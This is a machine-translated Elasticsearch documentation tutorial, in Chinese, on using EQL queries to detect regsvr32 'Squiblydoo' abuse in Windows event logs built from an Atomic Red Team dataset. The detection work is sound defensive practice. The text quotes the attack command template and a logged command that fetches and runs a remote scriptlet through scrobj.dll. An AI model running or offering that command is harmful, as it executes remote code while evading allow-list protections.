

[Elastic Docs](/guide/) ›[Elasticsearch Guide [8.9]](index.md) ›[EQL
search](eql.md)

[« EQL pipe reference](eql-pipe-ref.md) [SQL »](xpack-sql.md)

## 示例：使用 EQL 检测威胁

此示例教程演示如何使用 EQL 检测安全威胁和其他可疑行为。在此方案中，你的任务是检测 Windows事件日志中的 regsvr32 滥用。

'regsvr32.exe'是一个内置的命令行实用程序，用于在Windows中注册'.dll'库。作为一个原生工具，'regsvr32.exe'具有受信任的状态，可以绕过大多数允许列表软件和脚本阻止程序。有权访问用户命令行的攻击者可以使用"regsvr32.exe"通过".dll"库运行恶意脚本，即使在不允许此类脚本的计算机上也是如此。

regsvr32滥用的一个常见变体是Squiblydooattack。在Squiblydooattack中，'regsvr32.exe'命令使用'scrobj.dll"库来注册和运行远程脚本。这些命令通常如下所示：

    
    
    "regsvr32.exe  /s /u /i:<script-url> scrobj.dll"

###Setup

本教程使用来自 Atomic RedTeam 的测试数据集，其中包括模仿 Squiblydoo 攻击的事件。数据已映射到弹性通用架构 (ECS) 字段。

要开始使用：

1. 创建启用了数据流的索引模板：PUT /_index_template/my-data-stream-template { "index_patterns"： [ "my-data-stream*" ]， "data_stream"： { }， "priority"： 500 }

2. 下载"规范化-T1117-原子红-注册32.json"。  3. 使用批量 API 将数据索引到匹配的流：curl -H "Content-Type： application/json" -XPOST "localhost：9200/my-data-stream/_bulk？pretty&refresh" --data-binary "@normalized-T1117-AtomicRed-regsvr32.json"

4. 使用 cat 索引 API 验证数据是否已编制索引：响应 = client.cat.indices( index： 'my-data-stream'， v： true， h： 'health，status，index，docs.count' ) put response GET /_cat/indices/my-data-stream？v=true&h=health，status，index，docs.count

响应应显示"docs.count"为"150"。

    
        health status index                                 docs.count
    yellow open   .ds-my-data-stream-2099.12.07-000001         150

### 获取 regsvr32 事件的计数

首先，获取与"regsvr32.exe"进程关联的事件计数：

    
    
    GET /my-data-stream/_eql/search?filter_path=-hits.events    __{
      "query": """
        any where process.name == "regsvr32.exe" __""",
      "size": 200 __}

__

|

'？filter_path=-hits.events' 从响应中排除 'hits.events' 属性。此搜索仅用于获取事件计数，而不是匹配事件的列表。   ---|---    __

|

匹配"process.name"为"regsvr32.exe"的任何事件。   __

|

为匹配事件返回最多 200 次命中。   响应返回 143 个相关事件。

    
    
    {
      "is_partial": false,
      "is_running": false,
      "took": 60,
      "timed_out": false,
      "hits": {
        "total": {
          "value": 143,
          "relation": "eq"
        }
      }
    }

### 检查命令行项目

'regsvr32.exe'进程与143个事件相关联。但是'regsvr32.exe'最初是如何被叫的呢？谁叫的？'regsvr32.exe' 是一个命令行实用程序。将结果范围缩小到使用命令行的进程：

    
    
    GET /my-data-stream/_eql/search
    {
      "query": """
        process where process.name == "regsvr32.exe" and process.command_line.keyword != null
      """
    }

查询将一个事件与"event.type"的"creation"匹配，指示"regsvr32.exe"进程的开始。根据事件的"process.command_line"值，"regsvr32.exe"使用"scrobj.dll"来注册脚本"RegSvr32.sct"。这符合Squiblydoo攻击的行为。

    
    
    {
      ...
      "hits": {
        "total": {
          "value": 1,
          "relation": "eq"
        },
        "events": [
          {
            "_index": ".ds-my-data-stream-2099.12.07-000001",
            "_id": "gl5MJXMBMk1dGnErnBW8",
            "_source": {
              "process": {
                "parent": {
                  "name": "cmd.exe",
                  "entity_id": "{42FC7E13-CBCB-5C05-0000-0010AA385401}",
                  "executable": "C:\\Windows\\System32\\cmd.exe"
                },
                "name": "regsvr32.exe",
                "pid": 2012,
                "entity_id": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
                "command_line": "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll",
                "executable": "C:\\Windows\\System32\\regsvr32.exe",
                "ppid": 2652
              },
              "logon_id": 217055,
              "@timestamp": 131883573237130000,
              "event": {
                "category": "process",
                "type": "creation"
              },
              "user": {
                "full_name": "bob",
                "domain": "ART-DESKTOP",
                "id": "ART-DESKTOP\\bob"
              }
            }
          }
        ]
      }
    }

### 检查恶意脚本加载

检查 'regsvr32.exe' 稍后是否加载了 'scrobj.dll' 库：

    
    
    GET /my-data-stream/_eql/search
    {
      "query": """
        library where process.name == "regsvr32.exe" and dll.name == "scrobj.dll"
      """
    }

查询与事件匹配，确认"scrobj.dll"已加载。

    
    
    {
      ...
      "hits": {
        "total": {
          "value": 1,
          "relation": "eq"
        },
        "events": [
          {
            "_index": ".ds-my-data-stream-2099.12.07-000001",
            "_id": "ol5MJXMBMk1dGnErnBW8",
            "_source": {
              "process": {
                "name": "regsvr32.exe",
                "pid": 2012,
                "entity_id": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
                "executable": "C:\\Windows\\System32\\regsvr32.exe"
              },
              "@timestamp": 131883573237450016,
              "dll": {
                "path": "C:\\Windows\\System32\\scrobj.dll",
                "name": "scrobj.dll"
              },
              "event": {
                "category": "library"
              }
            }
          }
        ]
      }
    }

### 确定成功的可能性

在许多情况下，攻击者使用恶意脚本连接到远程服务器或下载其他文件。使用 EQL 序列查询检查以下一系列事件：

1. "regsvr32.exe"流程 2.通过相同的进程加载"scrobj.dll"库 3.同一进程的任何网络事件

根据上一个响应中看到的命令行值，您可以期望找到匹配项。但是，此查询不是为该特定命令设计的。相反，它会查找一种足够通用的可疑行为模式，以检测类似的威胁。

    
    
    GET /my-data-stream/_eql/search
    {
      "query": """
        sequence by process.pid
          [process where process.name == "regsvr32.exe"]
          [library where dll.name == "scrobj.dll"]
          [network where true]
      """
    }

查询与序列匹配，指示攻击可能成功。

    
    
    {
      ...
      "hits": {
        "total": {
          "value": 1,
          "relation": "eq"
        },
        "sequences": [
          {
            "join_keys": [
              2012
            ],
            "events": [
              {
                "_index": ".ds-my-data-stream-2099.12.07-000001",
                "_id": "gl5MJXMBMk1dGnErnBW8",
                "_source": {
                  "process": {
                    "parent": {
                      "name": "cmd.exe",
                      "entity_id": "{42FC7E13-CBCB-5C05-0000-0010AA385401}",
                      "executable": "C:\\Windows\\System32\\cmd.exe"
                    },
                    "name": "regsvr32.exe",
                    "pid": 2012,
                    "entity_id": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
                    "command_line": "regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll",
                    "executable": "C:\\Windows\\System32\\regsvr32.exe",
                    "ppid": 2652
                  },
                  "logon_id": 217055,
                  "@timestamp": 131883573237130000,
                  "event": {
                    "category": "process",
                    "type": "creation"
                  },
                  "user": {
                    "full_name": "bob",
                    "domain": "ART-DESKTOP",
                    "id": "ART-DESKTOP\\bob"
                  }
                }
              },
              {
                "_index": ".ds-my-data-stream-2099.12.07-000001",
                "_id": "ol5MJXMBMk1dGnErnBW8",
                "_source": {
                  "process": {
                    "name": "regsvr32.exe",
                    "pid": 2012,
                    "entity_id": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
                    "executable": "C:\\Windows\\System32\\regsvr32.exe"
                  },
                  "@timestamp": 131883573237450016,
                  "dll": {
                    "path": "C:\\Windows\\System32\\scrobj.dll",
                    "name": "scrobj.dll"
                  },
                  "event": {
                    "category": "library"
                  }
                }
              },
              {
                "_index": ".ds-my-data-stream-2099.12.07-000001",
                "_id": "EF5MJXMBMk1dGnErnBa9",
                "_source": {
                  "process": {
                    "name": "regsvr32.exe",
                    "pid": 2012,
                    "entity_id": "{42FC7E13-CBCB-5C05-0000-0010A0395401}",
                    "executable": "C:\\Windows\\System32\\regsvr32.exe"
                  },
                  "@timestamp": 131883573238680000,
                  "destination": {
                    "address": "151.101.48.133",
                    "port": "443"
                  },
                  "source": {
                    "address": "192.168.162.134",
                    "port": "50505"
                  },
                  "event": {
                    "category": "network"
                  },
                  "user": {
                    "full_name": "bob",
                    "domain": "ART-DESKTOP",
                    "id": "ART-DESKTOP\\bob"
                  },
                  "network": {
                    "protocol": "tcp",
                    "direction": "outbound"
                  }
                }
              }
            ]
          }
        ]
      }
    }

[« EQL pipe reference](eql-pipe-ref.md) [SQL »](xpack-sql.md)
